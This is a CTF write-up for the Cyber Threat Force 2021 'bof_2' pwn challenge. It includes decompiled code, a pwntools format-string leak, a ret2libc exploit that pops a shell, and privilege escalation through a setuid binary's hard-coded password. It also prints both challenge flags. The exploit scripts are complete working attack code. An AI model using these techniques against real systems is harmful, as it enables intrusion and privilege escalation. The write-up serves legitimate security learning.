---
title: "Writeup Cyber Threat Force : bof_2 (with PrivEsc)"
date: 2021-07-07T20:12:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "pwn"]
type: "posts"
showDate: true
---

For this challenge, we were also given a `service` executable. It was also hosted remotely.

NOTE: since I'm writting this after the CTF ended, the demos are done locally.

## Level 1

```bash
$ checksec service
[*] '/home/vivescere/ctf/bof_2/service'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

$ ./service
Hello authentifie toi !
Username: vivescere
Bienvenue vivescere
password: mypassword
oops i have lost my db sorry
```

This time, the only protection that's activated is PIE, which means addresses won't be stable. We can take a look at the the binary in Ghidra:

```c
undefined4 main(void) {
  ignorMe(&stack0x00000004);
  vuln();
  puts("oops i have lost my db sorry");
  return 0;
}

void vuln(void) {
  undefined *puVar1;
  size_t sVar2;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;
  byte bVar6;
  char cStack130;
  undefined local_81 [76];
  undefined4 uStack53;
  undefined local_31 [17];
  undefined4 uStack32;
  undefined auStack28 [12];
  
  bVar6 = 0;
  puts("Hello authentifie toi !");
  printf("Username: ");
  local_31._0_4_ = 0;
  uStack32 = 0;
  puVar1 = (undefined *)0x0;
  do {
    *(undefined4 *)(puVar1 + (int)(local_31 + 1)) = 0;
    puVar1 = puVar1 + 4;
  } while (puVar1 < auStack28 + -(int)(local_31 + 1));
  local_81._0_4_ = 0;
  uStack53 = 0;
  uVar4 = (uint)(local_31 + -(int)(local_81 + 1)) >> 2;
  puVar5 = (undefined4 *)(local_81 + 1);
  while (uVar4 != 0) {
    uVar4 = uVar4 - 1;
    *puVar5 = 0;
    puVar5 = puVar5 + (uint)bVar6 * -2 + 1;
  }
  fgets(local_81,0x50,stdin);
  sVar2 = strlen(local_81);
  (&cStack130)[sVar2] = '\0';
  printf("Bienvenue ");
  printf(local_81);
  printf("\npassword: ");
  __isoc99_scanf(&DAT_00012042,local_31);
  iVar3 = strcmp(local_31,local_81);
  if (iVar3 == 0) {
    puts("WTF ?");
  }
  return;
}
```

There is an obvious call to `printf` with `local_81`, which we can use in a format string exploit, and a call to `scanf`, which we'll use for our buffer overflow.

Starting with figuring out the offset:

```bash
$ cyclic 100  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
$ gdb ./service
...
gef➤  r
Starting program: /home/vivescere/ctf/bof_2/service 
Hello authentifie toi !
Username: a
Bienvenue a
password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "service", stopped 0x6e616161 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ q
$ cyclic -l 0x6e616161
49
```

Now we need to figure out the version of the libc that was used on the remote server. To do that, we're going to leak a few addresses from the stack.

Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at `0xf7cad000`).

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'ERROR'

exe = ELF("./service", checksec=False)

context.binary = exe
context.terminal = ['konsole', '-e']

for i in range(1, 1000):
    r = process([exe.path])
    r.recvuntil(': ')
    r.sendline(b'%' + str(i).encode() + b'$p-')
    greeting = r.recvuntil(': ')
    try:
        leaked_addr = int(greeting.split(b'-')[0].split(b' ')[-1].decode(), 16)
    except:
        leaked_addr = -1
    if hex(leaked_addr).startswith('0xf7'):
        print(b'%' + str(i).encode() + b'$p', hex(leaked_addr))
    r.close()
```

We can quickly identify the addresses that we get using GDB (`info symbol [addr]`):

```bash
%2$p 	  0xf7f64540 _IO_2_1_stdin_
...
%43$p 	0xf7dc0a0d __libc_start_main
```

.. now we can do the same on the remote host, and plug the values into the [libc database search](https://libc.blukat.me) website. After entering these values:

```
__libc_start_main_ret -> b41
_IO_2_1_stdin_        -> 5c0
```

We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was `libc6-i386_2.28-10_amd64`.

Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.

Here is the exploit script:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("XXX.XXX.XXX.XXX", 00000)

    return r

# libc6-i386_2.28-10_amd64
libc_config = {
    'io_2_1_stdin': 0x001da5c0,
    'system': 0x0003e9e0,
    'str_bin_sh': 0x17eaaa,
}

def main():
    r = conn()

    r.recvuntil(': ')
    r.sendline(b'%2$p-')
    greeting = r.recvuntil(': ')
    leaked_io_2_1_stdin = int(greeting.split(b'-')[0].split(b' ')[-1].decode(), 16)
    libc_address = leaked_io_2_1_stdin - libc_config['io_2_1_stdin']

    sys = p32(libc_address + libc_config['system'])
    sh = p32(libc_address + libc_config['str_bin_sh'])
    r.sendline(flat({49: sys + p32(0xcafebabe) + sh}))

    r.interactive()

if __name__ == "__main__":
    main()
```

The flag was in `/home/ctf/flag.txt`: `CYBERTF{l3@ks_I5_Us3Fu11}`.

## Level 2: PrivEsc

Looking in `/bin` again, we find a `readline` SETUID binary. I used the same snippet to download the file:

```python
def main():
    r = conn()

    r.recvuntil(': ')
    r.sendline(b'%2$p-')
    greeting = r.recvuntil(': ')
    leaked_io_2_1_stdin = int(greeting.split(b'-')[0].split(b' ')[-1].decode(), 16)
    libc_address = leaked_io_2_1_stdin - libc_config['io_2_1_stdin']

    sys = p32(libc_address + libc_config['system'])
    sh = p32(libc_address + libc_config['str_bin_sh'])
    r.sendline(flat({49: sys + p32(0xcafebabe) + sh}))

    with open('readline', 'wb') as f:
        r.sendline('cat /bin/readline')
        r.sendline('exit')
        f.write(r.recvall())
```

We can look at the binary in Ghidra:

```c
undefined8 main(int param_1,long param_2) {
  int iVar1;
  size_t sVar2;
  undefined8 uVar3;
  FILE *__stream;
  char *pcVar4;
  long lVar5;
  undefined8 *puVar6;
  long in_FS_OFFSET;
  byte bVar7;
  undefined8 local_426;
  undefined4 local_41e;
  undefined2 local_41a;
  undefined8 local_418;
  undefined8 local_410;
  undefined8 local_408 [127];
  long local_10;
  
  bVar7 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setreuid(0x3e9,0x3e9);
  if (param_1 != 3) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_426 = 0xaa333231efbeadde;
  local_41e = 0xc0ddccbb;
  local_41a = 0xeeff;
  puts("");
  sVar2 = strlen(*(char **)(param_2 + 8));
  if (sVar2 == 0xe) {
    iVar1 = check(&local_426,*(undefined8 *)(param_2 + 8),0xe,*(undefined8 *)(param_2 + 8));
    if (iVar1 == 0) {
      puts("Password check");
      local_418 = 0;
      local_410 = 0;
      lVar5 = 0x7e;
      puVar6 = local_408;
      while (lVar5 != 0) {
        lVar5 = lVar5 + -1;
        *puVar6 = 0;
        puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
      }
      __stream = fopen(*(char **)(param_2 + 0x10),"r");
      while( true ) {
        pcVar4 = fgets((char *)&local_418,0x400,__stream);
        if (pcVar4 == (char *)0x0) break;
        puts((char *)&local_418);
      }
      uVar3 = 0;
    }
    else {
      puts("Password failed");
      uVar3 = 1;
    }
  }
  else {
    uVar3 = 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}

int check(long param_1,long param_2,ulong param_3) {
  ulong local_10;
  
  local_10 = 0;
  while( true ) {
    if (param_3 <= local_10) {
      return 0;
    }
    if (*(char *)(local_10 + param_1) != *(char *)(local_10 + param_2)) break;
    local_10 = local_10 + 1;
  }
  return (int)*(char *)(local_10 + param_1) - (int)*(char *)(local_10 + param_2);
}
```

The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.

The `check` function is basically a `strcmp` clone, so the password is contained in `local_426`. Ghidra errors out a bit here, `local_426`, `local_41e` and `local_41a` are all the same variable.

Knowing this, we can now get the flag (which is in the home of the binary owner):

```bash
$ /bin/readline $(perl -e 'print "\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt"')
```

The flag is `CYBERTF{None_asciiPrint@ble:p}`.


## More

You can [view the sources on github](https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2) or [read other writeups](/blog/cyber-threat-force-ctf/).

